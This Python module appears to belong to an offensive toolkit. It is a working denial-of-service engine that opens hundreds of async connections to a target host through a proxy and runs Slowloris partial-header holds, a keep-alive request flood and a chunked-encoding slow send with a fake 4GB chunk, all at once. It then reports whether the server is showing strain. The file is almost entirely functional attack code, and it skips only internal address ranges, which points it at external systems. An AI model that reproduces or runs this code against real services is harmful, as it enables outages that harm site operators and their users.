"""
Connection Exhaustion Engine (Async v2)
— Slowloris: partial headers, keep sockets hanging
— Pool Flood: full request, keep-alive, re-fire
— Chunked Bomb: huge chunk size, trickle data

v2: True async via asyncio.open_connection(). No blocking sockets.
"""
import asyncio
import ipaddress
import ssl
import time
from typing import Dict, List, Optional
from urllib.parse import urlparse

from core.ui import ph, i, s, w, p, G, R, Y, C, W, N, B, draw_table

# Internal IP ranges — skip these
_INTERNAL_RANGES = [
    "127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
    "169.254.0.0/16", "::1/128", "fc00::/7",
]


# Socket counts per run — constants so the scan budget can be debited with
# the real number (runners/poison.py charges EXHAUST_SOCKETS per service).
SLOWLORIS_N = 500
POOL_N = 200
CHUNKED_N = 50
EXHAUST_SOCKETS = SLOWLORIS_N + POOL_N + CHUNKED_N


class ConnectionExhaust:
    """Multi-mode connection exhaustion — true async via asyncio streams."""

    def __init__(self, url: str, timeout: int = 30):
        parsed = urlparse(url)
        self.host = parsed.netloc or parsed.hostname or ""
        self.port = parsed.port or (443 if parsed.scheme == "https" else 80)
        self.use_ssl = parsed.scheme == "https"
        self.timeout = timeout
        self.results = {
            "slowloris": {"attempted": 0, "opened": 0, "refused": 0, "errors": 0},
            "pool_flood": {"attempted": 0, "completed": 0, "refused": 0, "errors": 0},
            "chunked_bomb": {"attempted": 0, "opened": 0, "refused": 0, "errors": 0},
            "total_time": 0,
            "server_downgrade": False,
            "skipped_internal": False,
        }
        self._start_time = 0
        self._ssl_context = None
        if self.use_ssl:
            self._ssl_context = ssl.create_default_context()
            self._ssl_context.check_hostname = False
            self._ssl_context.verify_mode = ssl.CERT_NONE

    def _is_internal(self) -> bool:
        try:
            addr = ipaddress.ip_address(self.host)
            for rng in _INTERNAL_RANGES:
                if addr in ipaddress.ip_network(rng, strict=False):
                    return True
        except ValueError:
            pass
        return False

    async def _open_connection(self):
        """Open a true async connection to target — tunneled via active proxy."""
        from core.proxy_manager import open_proxied_connection
        reader, writer = await open_proxied_connection(
            self.host,
            self.port,
            ssl=self._ssl_context if self.use_ssl else None,
            server_hostname=self.host if self.use_ssl else None,
            timeout=min(self.timeout, 10),
        )
        return reader, writer

    # Mode A: Slowloris (true async)

    async def _slowloris_async(self, idx: int):
        self.results["slowloris"]["attempted"] += 1
        writer = None
        try:
            reader, writer = await self._open_connection()
            self.results["slowloris"]["opened"] += 1

            # Send partial headers — no trailing CRLF CRLF
            partial_req = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\r\n"
                f"Accept: */*\r\n"
                f"X-Loris-{idx}: {idx}\r\n"
            )
            writer.write(partial_req.encode())
            await writer.drain()

            # Keep alive: send header every 10s
            deadline = time.time() + min(self.timeout, 25)
            while time.time() < deadline:
                await asyncio.sleep(10)
                try:
                    writer.write(f"X-KeepAlive-{idx}: {int(time.time())}\r\n".encode())
                    await writer.drain()
                except Exception:
                    break

            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
        except (ConnectionRefusedError, OSError, TimeoutError, asyncio.TimeoutError):
            self.results["slowloris"]["refused"] += 1
        except Exception:
            self.results["slowloris"]["errors"] += 1
        finally:
            # Always release the FD: the wave deadline can cancel this
            # coroutine mid-flight, and CancelledError bypasses the excepts.
            if writer is not None:
                try:
                    writer.close()
                except Exception:
                    pass

    # Mode B: Connection Pool Flood (true async)

    async def _pool_async(self, idx: int):
        self.results["pool_flood"]["attempted"] += 1
        writer = None
        try:
            reader, writer = await self._open_connection()

            body = "x" * 512
            req = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
                f"{body}"
            )

            reqs_done = 0
            deadline = time.time() + min(self.timeout, 15)
            while time.time() < deadline:
                try:
                    writer.write(req.encode())
                    await writer.drain()
                    # Read response (don't block forever)
                    try:
                        resp = await asyncio.wait_for(reader.read(4096), timeout=3)
                        if not resp:
                            break
                        reqs_done += 1
                    except (asyncio.TimeoutError, TimeoutError):
                        reqs_done += 1  # request sent, response timed out
                        continue
                except Exception:
                    break

            self.results["pool_flood"]["completed"] += reqs_done
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
        except (ConnectionRefusedError, OSError, TimeoutError, asyncio.TimeoutError):
            self.results["pool_flood"]["refused"] += 1
        except Exception:
            self.results["pool_flood"]["errors"] += 1
        finally:
            if writer is not None:
                try:
                    writer.close()
                except Exception:
                    pass

    # Mode C: Chunked Slow Send (true async)

    async def _chunked_async(self, idx: int):
        self.results["chunked_bomb"]["attempted"] += 1
        writer = None
        try:
            reader, writer = await self._open_connection()

            # Open chunked request with max chunk size
            req = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Transfer-Encoding: chunked\r\n"
                f"\r\n"
                f"FFFFFFFF\r\n"  # 4GB chunk size claim
            )
            writer.write(req.encode())
            await writer.drain()
            self.results["chunked_bomb"]["opened"] += 1

            # Trickle 1 byte per 5s
            deadline = time.time() + min(self.timeout, 20)
            while time.time() < deadline:
                await asyncio.sleep(5)
                try:
                    writer.write(b"x")
                    await writer.drain()
                except Exception:
                    break

            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
        except (ConnectionRefusedError, OSError, TimeoutError, asyncio.TimeoutError):
            self.results["chunked_bomb"]["refused"] += 1
        except Exception:
            self.results["chunked_bomb"]["errors"] += 1
        finally:
            if writer is not None:
                try:
                    writer.close()
                except Exception:
                    pass

    # Run All

    async def run(self) -> Dict:
        """Run all 3 attack modes in parallel — truly async."""
        if self._is_internal():
            w(f"Target {self.host} is internal — skipping connection exhaust")
            self.results["skipped_internal"] = True
            return self.results

        ph("CONNECTION EXHAUSTION: Slowloris + Pool Flood + Chunked Bomb [async]")
        i(f"Target: {C}{self.host}:{self.port}{N}")

        self._start_time = time.time()

        slow_tasks = [self._slowloris_async(i) for i in range(SLOWLORIS_N)]
        pool_tasks = [self._pool_async(i) for i in range(POOL_N)]
        chunk_tasks = [self._chunked_async(i) for i in range(CHUNKED_N)]

        i(f"Slowloris: {B}{SLOWLORIS_N}{N} | Pool Flood: {B}{POOL_N}{N} | Chunked: {B}{CHUNKED_N}{N}")
        all_tasks = slow_tasks + pool_tasks + chunk_tasks
        await asyncio.gather(*all_tasks, return_exceptions=True)

        self.results["total_time"] = round(time.time() - self._start_time, 1)

        sl = self.results["slowloris"]
        pf = self.results["pool_flood"]
        cb = self.results["chunked_bomb"]

        total_attempted = sl["attempted"] + pf["attempted"] + cb["attempted"]
        total_refused = sl["refused"] + pf["refused"] + cb["refused"]
        self.results["server_downgrade"] = (
            total_refused > (total_attempted * 0.3) if total_attempted > 0 else False
        )

        rows = [
            ["Slowloris", f"{G if sl['opened'] > sl['refused'] else R}{sl['opened']}/{sl['refused']}/{sl['errors']}{N}",
             f"{'OPEN' if sl['opened'] > 0 else 'BLOCKED'}"],
            ["Pool Flood", f"{G if pf['completed'] > 100 else ''}{pf['completed']}/{pf['refused']}/{pf['errors']}{N}",
             f"{'FLOODING' if pf['completed'] > 100 else 'SLOW'}"],
            ["Chunked Bomb", f"{G if cb['opened'] > 0 else R}{cb['opened']}/{cb['refused']}/{cb['errors']}{N}",
             f"{'HANG' if cb['opened'] > 0 else 'REJECTED'}"],
        ]
        draw_table(["MODE", "OPEN/REFUSED/ERR", "STATUS"], rows, title="Connection Exhaust Results")

        p(f"Total: {B}{total_attempted}{N} connections in {self.results['total_time']}s")
        if total_refused > 0:
            w(f"{total_refused} connections refused — connection pool showing strain")
        if self.results["server_downgrade"]:
            s(f"{R}[!] Server degradation detected{N} — >30% connections refused")

        return self.results
